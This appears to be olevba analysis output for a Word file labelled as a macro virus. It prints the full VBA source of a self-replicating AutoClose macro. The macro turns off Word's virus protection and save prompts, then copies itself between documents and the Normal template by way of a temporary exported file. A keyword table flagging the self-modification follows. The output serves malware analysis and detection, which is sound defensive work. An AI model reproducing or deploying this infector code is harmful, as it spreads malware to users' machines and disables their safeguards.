olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CPCK-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CPCK-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
JN49 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EK29 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.VirusProtection = 0
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Application.EnableCancelKey = 0
If JN49 > 0 And EK29 > 0 Then GoTo HT45
If JN49 = 0 Then
Set HF9 = ActiveDocument.VBProject.VBComponents.Item(1)
NC64 = True
End If
If EK29 = 0 Then
Set HF9 = NormalTemplate.VBProject.VBComponents.Item(1)
GA49 = True
End If
If GA49 = True Then
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\chklist.ms"
HF9.CodeModule.AddFromFile ("c:\chklist.ms")
HF9.CodeModule.deletelines 1, 4
HF9.CodeModule.replaceline 1, "Sub AutoClose()"
ElseIf NC64 = True Then
HF9.CodeModule.AddFromFile ("c:\chklist.ms")
HF9.CodeModule.deletelines 1, 4
End If
HT45:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: ./Virus.MSWord.CPCK-based - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

